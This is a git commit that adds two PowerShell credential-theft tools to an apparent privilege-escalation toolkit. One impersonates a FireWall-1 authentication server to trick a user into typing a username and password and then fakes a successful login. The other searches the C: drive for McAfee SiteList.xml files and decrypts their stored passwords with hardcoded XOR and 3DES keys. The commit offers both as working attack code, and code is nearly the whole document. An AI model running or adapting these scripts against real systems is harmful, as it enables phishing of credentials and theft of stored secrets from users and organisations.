5df348d50170dbadcc489a5daeba7b902a6176a0
Pierre-Alexandre Braeken <pabraeken@gmail.com>
2016-02-11 22:43:40 -0500

    Elevate your rights - get passwords!
    Get-FirewallCredential : a very old vulnerability that target FireWall-1
    Session Authentication Agent and which is sometimes still installed on
    workstation
    
    Get-MacAfee : exploit the vulnerability found by @funoverip and retrieve
    passwords in plaintext

---
+++ EYLR/Get-FirewallCredential.ps1
@@ -0,0 +1,98 @@
+﻿<#
+
+Based on the work of Andrew Danforth <acd@weirdness.net>
+http://www.securityfocus.com/bid/1661/exploit
+
+#>
+
+[CmdletBinding()]
+param (
+     [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true, Position=0)]
+        [ValidateScript({$_ -match [IPAddress]$_ })]  
+        [string] $TargetIP,
+    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true, Position=1)] 
+        [Int32] $TargetPort = 261,
+    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true, Position=2)] 
+        [String] $FirewallName = "Corporate Firewall",
+    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true, Position=3)] 
+        [String] $PasswordPrompt = "FireWall-1 password"
+)
+
+
+function Get-ReturnTCPStream {
+param(
+    $Stream
+)    
+    $buffer = New-Object System.Byte[] 1024
+    $encodingASCII = New-Object System.Text.AsciiEncoding
+
+    $returnStream = ""
+    $dataRetrieved = $false
+
+    While(!($stream.DataAvailable)){
+        continue
+    }
+
+    do {                               
+        $Stream.ReadTimeout = 1000
+        $dataRetrieved = $false
+        do {
+            try {             
+                $bytesRead = $Stream.Read($buffer, 0, 1024)             
+                if($bytesRead -gt 0) {
+                    $dataRetrieved = $true
+                    $returnStream += ($encodingASCII.GetString($buffer, 0, $bytesRead))                    
+                }
+            } catch { $dataRetrieved = $false; $bytesRead = 0 }
+        } while($bytesRead -gt 0 -and $tcpConnection.Connected)
+    } while($dataRetrieved -and $tcpConnection.Connected)
+    
+    $returnStream
+}
+
+try {
+    $tcpConnection = New-Object System.Net.Sockets.TcpClient($targetIP, $targetPort)
+    $tcpStream = $tcpConnection.GetStream()
+    $reader = New-Object System.IO.StreamReader($tcpStream)
+    $writer = New-Object System.IO.StreamWriter($tcpStream)
+    $writer.AutoFlush = $true
+
+    while ($tcpConnection.Connected) {    
+    
+        Write-Output "Socket $($tcpConnection.GetHashCode()) connected"        
+        $command = "220 FW-1 Session Authentication Request from $FirewallName`n`r";
+        $writer.WriteLine($command)
+        Write-Output "Greeting sent to $targetIP"
+        $command = "331 User:`n`r"
+        $writer.WriteLine($command)
+        Write-Output "User request sent"
+
+        $user = Get-ReturnTCPStream -Stream $tcpStream
+        
+        Write-Output "User: $user"
+        
+        $command = "331 *$PasswordPrompt :"
+        $writer.WriteLine($command) 
+
+        $password = Get-ReturnTCPStream -Stream $tcpStream
+        Write-Output "Password: $password"
+
+        $command = "200 User username authenticated by FireWall-1 authentication."
+        $writer.WriteLine($command) | Out-Null
+        Write-Output "User 'authenticated' ;-)"
+        $command = "230 OK"
+        $writer.WriteLine($command) | Out-Null
+        $writer.Flush()
+        start-sleep -Milliseconds 500
+
+        $reader.Close()
+        $writer.Close()
+        $tcpConnection.Close()
+
+        Write-Output "TCP connection closed"
+    }          
+    
+}
+catch {
+    $_
+}
---
+++ EYLR/Get-MacAfee.ps1
@@ -0,0 +1,119 @@
+﻿<#
+
+Based on the work of @funoverip
+https://github.com/funoverip/mcafee-sitelist-pwd-decryption\
+
+#>
+
+function Get-DecryptTripleDESPassword($passwordByte, $key) {  
+    try{              
+        $arrayKey = $key -split ', '
+        $keyByte = @()
+        foreach($ak in $arrayKey){
+            $keyByte += [System.Convert]::ToByte($ak,16)        
+        }
+        $TripleDES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider                
+        $TripleDES.Key = $keyByte
+        $TripleDES.Mode = [System.Security.Cryptography.CipherMode]::ECB
+        $TripleDES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $decryptorObject = $TripleDES.CreateDecryptor()
+        [byte[]] $outBlock = $decryptorObject.TransformFinalBlock($passwordByte, 0 , $passwordByte.Length)
+
+        $TripleDES.Clear()
+
+        return [System.Text.UnicodeEncoding]::Default.GetString($outBlock)
+     }
+     catch {
+        Write-Error $_
+    }
+}
+
+
+function Get-XOR ($toBeXored) {
+    $keyByte = @()
+    $arrayXorKey = "12,15,0F,10,11,1C,1A,06,0A,1F,1B,18,17,16,05,19" -split ','
+    foreach($axk in $arrayXorKey){
+        $keyByte += [System.Convert]::ToByte($axk,16)  
+    }    
+	$j = 0
+	$output=''
+    $conversion = $null
+    $tot = $toBeXored.Length
+    $i=0
+	while ($i -lt $tot) {
+		$output = ($toBeXored[$i] -bxor $keyByte[$j])
+
+        if($i -gt 0) {
+            $conversion += ",$output"
+        }
+        else {
+            $conversion += "$output"
+        }    
+		$j++
+		if (($j%16) -eq 0) {
+			$j=0	
+        }
+        $i++
+    }
+    $conversion
+}
+
+function Get-MacAfeeInnerFields {
+    [CmdletBinding()]
+        Param (
+            $File 
+        )
+                
+    $Filename = Split-Path $File -Leaf
+    [xml] $Xml = Get-Content ($File)
+    
+    $passwordEncrypted = @()
+    $passwordStore = @()
+        
+    if ($Xml.innerxml -like "*Password*"){            
+        Write-Verbose "Potential password in $File"        
+        $passwordEncrypted = $Xml.GetElementsByTagName("Password")
+    }
+              
+    foreach ($pass in $passwordEncrypted) {
+        Write-Verbose "Decrypting $($Pass.InnerXML)"
+        $decryptedPassword = Get-DecryptedPassword $Pass.InnerXML
+        Write-Verbose "Decrypted a password of $decryptedPassword"        
+        $passwordStore += , $decryptedPassword
+    }
+            
+    if (!($passwordStore)) {$passwordStore = '<empty>'}
+                  
+    $ObjectProperties = @{'Passwords' = $passwordStore}
+                
+    $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
+    Write-Verbose "The password is between {} and may be more than one value."
+    if ($ResultsObject) {Return $ResultsObject}         
+}    
+function Get-DecryptedPassword ($stringFound) {
+    $base64Decoded = [Convert]::FromBase64String($stringFound)     
+
+    $passwordToBeDecrypted = Get-XOR $base64Decoded
+
+    $desKey = ("0x3E, 0xF1, 0x36, 0xB8, 0xB3, 0x3B, 0xEF, 0xBC, 0x34, 0x26, 0xA7, 0xB5, 0x4E, 0xC4, 0x1A, 0x37, 0x7C, 0xD3, 0x19, 0x9B, 0x00, 0x00, 0x00, 0x00")
+
+    $passwordToBeDecryptedBytes = @()
+    $passwordToBeDecryptedBytes = $passwordToBeDecrypted -split ','
+
+    $passwordRevealed = Get-DecryptTripleDESPassword $passwordToBeDecryptedBytes $desKey
+    $passwordRevealed
+}
+
+# You can check this path only $file = "C:\Documents and Settings\All Users\Application Data\McAfee\Common Framework\SiteList.xml"
+
+$XMlFiles = Get-ChildItem -Path "C:\" -Recurse -ErrorAction SilentlyContinue -Include 'SiteList.xml'
+
+Write-Output "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
+
+foreach ($file in $XMLFiles) {
+    $results = (Get-MacAfeeInnerFields $file)
+    foreach ($result in $results) {          
+        $result.Passwords
+    }
+
+}
